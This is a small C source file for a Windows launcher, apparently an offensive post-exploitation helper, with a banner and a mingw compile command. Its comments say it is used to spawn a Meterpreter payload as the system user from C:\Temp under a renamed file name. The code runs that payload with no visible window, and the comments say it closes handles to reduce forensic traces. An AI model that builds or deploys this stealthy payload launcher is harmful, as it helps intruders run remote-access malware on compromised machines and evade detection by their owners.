//  ┓      ┓       ┓  ┓   
// ┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
// ┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
//            ┛          ┛
// ┳┓┏┓┓┏┏┓┏┓┓┏┓          
// ┃┃ ┫┣┫┣┫┃ ┃┫           
// ┻┛┗┛┛┗┛┗┗┛┛┗┛   
// compile: x86_64-w64-mingw32-gcc -o Process.exe source.c -mwindows

#include <windows.h>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the process window

    ZeroMemory(&pi, sizeof(pi));

    // spawning a process from C:\Temp folder. generally used for spawning meterpreter on system user, remember, change program name from changethis to anything
    if (!CreateProcess("C:\\Temp\\changethis.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { //Use Powershell Spawn Process for better results
        return 1;  // exit if execution fails
    }

    // close handles to reduce forensic traces
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
